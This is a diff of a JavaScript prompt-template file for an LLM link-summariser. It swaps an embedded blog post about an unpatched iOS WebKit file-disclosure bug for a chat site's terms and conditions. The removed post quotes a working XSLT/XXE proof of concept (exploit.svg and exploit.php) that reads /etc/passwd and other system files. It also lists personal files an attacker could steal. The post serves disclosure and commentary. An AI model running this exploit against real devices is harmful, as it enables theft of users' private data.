@@ -945,89 +945,26 @@ function cleanTitle(title) {
 if (require.main == module) {
   (async function () {
     const template = `
+      Create a concise, engaging summary about an article titled [Commonroom: Terms & Conditions], suitable for a link-summarising and sharing platform. Include relevant follow-up exploratory <a data-explore="..."> links to help the user explore related topics (these will be processed afterwards). Focus on key technical details and current relevance. Include suggestions for relevant source links and ensure the tone is suited to a knowledgeable, tech-oriented audience. Aim to spark interest and discussion within the community.
 
-      Create a concise, engaging summary about an article titled [No new iPhone? No secure iOS: Looking at an unfixed iOS vulnerability], suitable for a link-summarising and sharing platform. Include relevant follow-up exploratory <a data-explore="..."> links to help the user explore related topics (these will be processed afterwards). Focus on key technical details and current relevance. Include suggestions for relevant source links and ensure the tone is suited to a knowledgeable, tech-oriented audience. Aim to spark interest and discussion within the community.
-
-https://joshua.hu/apple-ios-patched-unpatched-vulnerabilities
+https://www.commonroom.chat/
 \`\`\`article
 <div id="readability-page-1" class="page"><div>
-
-<p>What’s the deal with iOS security updates, anyway?</p>
-<p>Not everybody can afford the newest and greatest Apple product. Luckily, Apple continues to support nearly-decade-old devices like the iPhone 6S, which and iOS 15.8 is still powering those devices, seemingly with official Apple support, with the latest update from <a href="https://support.apple.com/en-gb/109032">October the 25th, which addressed some security vulnerabilities</a>.</p>
-<p>In reality, however, Apple seems to only be addressing <em>some</em> security issues in its older supported devices.</p>
-<hr>
-<p>On June the 28th, Chromium announced that it had patched a vulnerability titled <a href="https://chromereleases.googleblog.com/2023/08/stable-channel-update-for-desktop_15.html">“CVE-2023-4357: Insufficient validation of untrusted input in XML”</a>. In the <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1458911">bug report</a> for that issue, it was shown that on various devices, Google Chrome’s Blink rendering engine could reveal the contents of arbitrary files: <code>/etc/passwd</code>, for example. Interestingly, this also included Chrome for iOS. Given that Apple forces all browsers in iOS to use the WebKit rendering engine, that meant this vulnerability not only affected Blink, but also WebKit.</p>
-<hr>
-<p>Taking that exploit from June:</p>
-<p><code>exploit.svg</code>:</p>
-<div>
-<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;?xml-stylesheet type="text/xsl" href="?#"?&gt;
-&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
-
-&lt;xsl:template match="/"&gt;
-
-&lt;svg width="1000%" height="1000%" version="1.1" xmlns="http://www.w3.org/2000/svg"&gt;
-&lt;foreignObject class="node" font-size="18" width="100%" height="100%"&gt;
-&lt;body xmlns="http://www.w3.org/1999/xhtml"&gt;
-&lt;xmp&gt;&lt;xsl:copy-of select="document('exploit.php')"/&gt;&lt;/xmp&gt;
-&lt;/body&gt;
-&lt;/foreignObject&gt;
-&lt;/svg&gt;
-
-&lt;/xsl:template&gt;
-&lt;/xsl:stylesheet&gt;</code></pre>
-</div>
-<p><code>exploit.php</code>:</p>
-<div>
-<pre><code>&lt;?php header("Access-Control-Allow-Origin: *");?&gt;
-&lt;!DOCTYPE p [
-&lt;!ENTITY passwd SYSTEM "file:///etc/passwd"&gt;
-&lt;!ENTITY hosts SYSTEM "file:///etc/hosts"&gt;
-&lt;!ENTITY group SYSTEM "file://localhost/etc/group"&gt;
-]&gt;
-&lt;p&gt;
-
-&lt;p style="border-style: dotted;"&gt;/etc/passwd:
-&amp;passwd;
-&lt;/p&gt;
-&lt;p style="border-style: dotted;"&gt;/etc/hosts:
-
-&amp;hosts;
-&lt;/p&gt;
-&lt;p style="border-style: dotted;"&gt;/etc/group:
-
-&amp;group;
-&lt;/p&gt;
-
-&lt;/p&gt;</code></pre>
-</div>
-<p>Aand trying it on the latest version of iOS that the (supported) iPhone 6S, we indeed see that the exploit <em>still</em> works. When opening the page, your <code>/etc/passwd</code> is there for the world to see.</p>
-<p>That means that any website visited by anybody using an iPhone 6S (or possibly later versions) can silently steal internal system files. What files could somebody steal? Well, there’s always:</p>
-<ul>
-<li>AddressBook.sqlitedb: which contains all of the personal contact information of the user and any saved contacts.</li>
-<li>call_history.db: which contains all received, dialled, and missed calls of the user.</li>
-<li>SMS/call_history.db: which contains the SMS history of the user.</li>
-</ul>
-<p>Or maybe:</p>
-<ul>
-<li>History.plist: which contains the browsing history of the user.</li>
-<li>Cookies.plist: which contains the browser’s cookies  including authentication cookies, which an attacker can re-use once they are stolen.</li>
-</ul>
-<hr>
-<p>After contacting Apple to see whether they intended to patch this, the response was quite short: <code>If in the future you are able to reproduce this issue using a different device that's running iOS 17 or later, please let us know.</code></p>
-<p>This raises some interesting questions. First off, does it imply that Apple does not patch vulnerabilities in older versions of iOS unless they may used to root/jailbreak the iPhone, or are known to be actively being either mass-exploited or exploited by some nation-state?</p>
-<p>A <a href="https://github.com/skysafe/reblog/tree/main/cve-2023-45866">new exploit targeting the iOS</a> (among other OS’) Bluetooth stack has also been <a href="https://support.apple.com/en-us/HT214035">left unpatched by Apple in all versions except iOS 17</a>.</p>
-<p>If I was an exploit vendor, I would be paying very close attention to vulnerabilities fixed in iOS 17, and seeing whether they work on previous (supported) iOS versions. Not every target has the newest Apple device, and minimal amount of surveillance may save the vendor from burning a 0day on a target that is using a slightly older device.</p>
-<hr>
-<p>Note: I haven’t tested this against older (supported) MacOS versions, but it’s definitely possible that Safari is exploitable here, too.</p>
-<p>Published on December 16th, 2023 by Joshua Rogers</p>
-
-
-
+<p>📄 Terms &amp; Conditions</p>
+<h2 id="welcome-to-commonroom">Welcome to Commonroom!</h2>
+<p>Each chat here is a transient journey, echoing the ephemeral nature of hostel common rooms. Our platform offers a space for serendipitous and fleeting group connections.</p>
+<p>As you begin making anonymous friends on Commonroom, we ask that you navigate with respect and consideration. In this shared space, we uphold a few simple rules to ensure that everyone enjoys their time in our rooms:</p>
+<ol type="1">
+<li><strong>Acceptance of Terms:</strong> By accessing or using Commonroom, you agree to be bound by these terms and conditions. If you do not agree with any part of these terms, please do not use our platform.</li>
+<li><strong>User Conduct:</strong> We believe in the power of respectful and positive interactions. Any form of harassment, hate speech, or disrespectful behavior will not be tolerated.</li>
+<li><strong>Age Requirement:</strong> Users must be 18 years or older to use Commonroom. Minors are not permitted to use our platform.</li>
+<li><strong>Content Guidelines:</strong> Share content that is appropriate and respectful. Any content deemed offensive, harmful, or inappropriate will be removed, and may result in an IP ban.</li>
+</ol>
+<p>Embark on your Commonroom adventure with an open heart and a curious mind. Happy chatting!</p>
+<p><em>PS: Nothing lasts forever.</em></p>
+<p>I Accept the Terms &amp; Conditions. Let me Join the Chat!</p>
 </div></div>
 \`\`\`
-
 `
 ;
     const d = await get_llm_raw(
